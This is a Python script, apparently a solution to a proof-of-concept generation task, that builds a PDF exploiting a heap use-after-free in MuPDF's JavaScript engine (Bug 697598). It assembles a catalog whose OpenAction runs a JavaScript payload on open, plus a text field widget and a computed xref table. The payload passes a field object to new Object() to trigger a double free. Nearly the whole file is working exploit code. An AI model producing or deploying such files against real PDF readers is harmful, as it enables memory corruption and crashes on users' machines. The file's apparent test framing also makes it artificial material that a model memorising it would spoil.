import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Use After Free vulnerability in MuPDF.
        The vulnerability (Bug 697598) occurs when passing a Dict object to the Object() 
        constructor in JavaScript, which fails to increment the reference count, 
        leading to a double free/UAF on destruction.
        """
        
        # PDF Header
        header = b"%PDF-1.7\n"
        
        # Object 1: Catalog
        # Sets up the OpenAction to run the JS payload automatically.
        obj1 = (
            b"1 0 obj\n"
            b"<< /Type /Catalog /Pages 2 0 R /AcroForm 4 0 R /OpenAction 6 0 R >>\n"
            b"endobj\n"
        )
        
        # Object 2: Pages Dictionary
        obj2 = (
            b"2 0 obj\n"
            b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>\n"
            b"endobj\n"
        )
        
        # Object 3: Page
        # Includes the annotation (field widget) to ensure it is instantiated.
        obj3 = (
            b"3 0 obj\n"
            b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Annots [5 0 R] >>\n"
            b"endobj\n"
        )
        
        # Object 4: AcroForm Dictionary
        # References the field.
        obj4 = (
            b"4 0 obj\n"
            b"<< /Fields [5 0 R] >>\n"
            b"endobj\n"
        )
        
        # Object 5: The Field (Widget)
        # Defines a Text field named "tf".
        obj5 = (
            b"5 0 obj\n"
            b"<< /Type /Annot /Subtype /Widget /FT /Tx /T (tf) /Rect [0 0 100 100] /P 3 0 R >>\n"
            b"endobj\n"
        )
        
        # Object 6: JavaScript Action
        # Payload:
        # 1. Retrieve the field object 'f' (which wraps the dictionary in Obj 5).
        # 2. Pass 'f' to 'new Object()'. This creates a new wrapper 'o' around the same underlying dictionary.
        #    Due to the vulnerability, the reference count of the dictionary is NOT incremented.
        # 3. When 'f' and 'o' go out of scope (at document close or GC), the dictionary is freed twice 
        #    (or accessed after free), causing the crash.
        js_payload = b'var f = this.getField("tf"); var o = new Object(f);'
        obj6 = (
            b"6 0 obj\n"
            b"<< /Type /Action /S /JavaScript /JS (" + js_payload + b") >>\n"
            b"endobj\n"
        )

        objects = [obj1, obj2, obj3, obj4, obj5, obj6]
        
        # Construct body
        body = b"".join(objects)
        
        # Calculate offsets for Xref table
        offsets = []
        current_pos = len(header)
        for obj in objects:
            offsets.append(current_pos)
            current_pos += len(obj)
        
        # Construct Xref table
        # 0 is the special null object. 1-6 are our objects.
        xref = b"xref\n0 7\n0000000000 65535 f \n"
        for offset in offsets:
            xref += f"{offset:010} 00000 n \n".encode('ascii')
            
        # Construct Trailer
        trailer = (
            b"trailer\n"
            b"<< /Size 7 /Root 1 0 R >>\n"
        )
        
        # Startxref and EOF
        footer = (
            b"startxref\n"
            + str(current_pos).encode('ascii') + b"\n"
            b"%%EOF"
        )
        
        return header + body + xref + trailer + footer